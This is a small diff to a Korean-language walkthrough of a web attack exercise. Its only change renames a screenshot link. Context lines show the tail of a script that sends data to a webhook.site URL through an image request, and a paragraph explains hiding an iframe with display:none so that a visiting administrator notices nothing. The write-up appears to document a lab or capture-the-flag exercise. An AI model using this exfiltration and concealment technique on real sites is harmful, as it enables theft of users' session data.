@@ -73,7 +73,7 @@ new Image().src = "https://webhook.site/741989d6-cb27-411b-aa44-a01355948028?c="
 </script>
 ```
 
-![페이로드](./screenshots/steal2_post.png)
+![페이로드](./screenshots/steal2_payload.png)
 
 - `iframe`에 `style="display:none"` 속성을 설정하여, **외부 페이지의 DOM 접근과 form 전송은 가능하게 유지하면서도 UI 요소가 노출되지 않도록 구성**했다. 이를 통해 관리자가 공격 페이지에 접근하더라도 화면 상으로는 아무런 변화가 없어 의심을 피할 수 있다.
 
